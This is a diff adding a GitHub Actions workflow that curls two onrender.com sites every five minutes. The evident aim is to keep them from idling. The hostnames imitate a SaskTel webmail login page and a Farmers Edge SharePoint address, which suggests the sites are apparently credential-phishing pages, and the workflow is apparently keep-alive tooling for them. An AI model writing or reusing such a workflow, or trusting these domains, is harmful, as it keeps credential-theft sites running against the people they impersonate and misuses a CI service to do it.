@@ -1,0 +1,27 @@
+# .github/workflows/ping.yml
+name: Parallel Ping Websites Every 5 Minutes
+
+on:
+  schedule:
+    - cron: '*/5 * * * *'  # every 5 minutes
+  workflow_dispatch:
+
+jobs:
+  ping:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Ping all websites in parallel
+        run: |
+          urls=(
+            "https://webmail-sasktel-net-login.onrender.com"
+            "https://https-farmersedge-my-sharepoint-com-w-g.onrender.com"
+          )
+
+          for url in "${urls[@]}"; do
+            {
+              echo "Pinging $url"
+              curl -s "$url" && echo "✅ Success: $url" || echo "❌ Failed: $url"
+            } &
+          done
+
+          wait  # Wait for all background curl jobs to finish
